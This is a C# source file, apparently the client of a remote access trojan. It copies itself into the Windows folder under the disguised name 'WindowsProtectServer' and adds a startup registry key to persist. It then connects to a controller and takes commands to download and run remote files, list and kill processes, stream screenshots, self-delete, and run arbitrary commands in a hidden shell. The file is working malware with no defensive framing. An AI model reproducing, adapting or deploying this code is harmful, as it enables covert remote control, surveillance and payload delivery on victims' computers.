using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using System.Reflection;
using System.Net;

namespace Client
{
    class Program
    {
        public static BinaryReader br;
        public static BinaryWriter bw;
        static void Main(string[] args)
        {
        a:
            TcpClient client = new TcpClient();
            try
            {
                if (!File.Exists(@"C:\Windows\WindowsProtectServer.exe"))
                {
                    File.Copy(Assembly.GetEntryAssembly().Location, @"C:\Windows\WindowsProtectServer.exe");
                    RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                    RKey.SetValue("WindowsProtectServer", @"C:\Windows\WindowsProtectServer.exe");
                }
            }
            catch
            {

            }
            while(true)
            {
                try
                {
                    client.Connect("127.0.0.1", 2021);
                    break;
                }
                catch
                {
                }
            }
            while(true)
            {
                b:
                try
                {
                    NetworkStream clientStream = client.GetStream();
                    br = new BinaryReader(clientStream);
                    string receive = br.ReadString();
                    if (receive == "")
                    {

                    }
                    else if (receive == "Del")
                    {
                        try
                        {
                            RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                            RKey.DeleteValue("WindowsProtectServer");
                            File.Delete(@"C:\Windows\WindowsProtectServer.exe");
                            Environment.Exit(0);
                        }
                        catch
                        {
                            Environment.Exit(0);
                        }
                    }
                    else if (receive.Substring(0, 3) == "dar")
                    {
                        string[] receiveplus = receive.Split(',');
                        WebClient webclient = new WebClient();
                        try
                        {
                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                            webclient.DownloadFile(receiveplus[2].ToString(), receiveplus[3].ToString());
                            if (receiveplus[1] == "1")
                            {
                                Process.Start(receiveplus[3].ToString());
                            }
                            bw = new BinaryWriter(clientStream);
                            bw.Write("操作成功完成！");
                        }
                        catch (Exception e)
                        {
                            bw = new BinaryWriter(clientStream);
                            bw.Write(e.Message);
                        }
                    }
                    else if (receive == "prm")
                    {
                        try
                        {
                            Process[] processes = Process.GetProcesses(".");
                            string pname = null;
                            string pid = null;
                            string pplace = null;
                            foreach (Process p in processes)
                            {
                                pname += p.ProcessName.ToString() + ",";
                                pid += p.Id.ToString() + ",";
                                pplace += p.PrivateMemorySize64.ToString() + ",";
                            }
                            bw = new BinaryWriter(clientStream);
                            bw.Write(pname);
                            Thread.Sleep(100);
                            bw.Write(pid);
                            Thread.Sleep(100);
                            bw.Write(pplace);
                        }
                        catch
                        {

                        }
                    }
                    else if (receive.Substring(0, 3) == "prk")
                    {
                        try
                        {
                            string[] receiveplus = receive.Split(',');
                            Process p = Process.GetProcessById(Int32.Parse(receiveplus[1]));
                            p.Kill();
                        }
                        catch
                        {

                        }
                    }
                    else if (receive == "srm") 
                    {
                        try
                        {
                            while (true)
                            {
                                Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                Graphics g = Graphics.FromImage(image);
                                g.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                                MemoryStream ms = new MemoryStream();
                                image.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                                ms.Seek(0, SeekOrigin.Begin);
                                byte[] bytes = new byte[ms.Length];
                                ms.Read(bytes, 0, bytes.Length);
                                ms.Dispose();
                                bw = new BinaryWriter(clientStream);
                                bw.Write(bytes.Length);
                                Thread.Sleep(100);
                                bw.Write(bytes);
                                string re = br.ReadString();
                                if (re == "stop")
                                {
                                    goto b;
                                }
                            }
                        }
                        catch
                        {

                        }
                    }
                    else if(receive == "exit")
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                        p.StandardInput.WriteLine(receive + "&exit");
                        p.StandardInput.AutoFlush = true;
                        string output = p.StandardOutput.ReadToEnd();
                        p.Close();
                        bw = new BinaryWriter(clientStream);
                        bw.Write(output);
                    }
                }
                catch
                {
                    client.Close();
                    break;
                }
            }
            goto a;
        }
    }
}
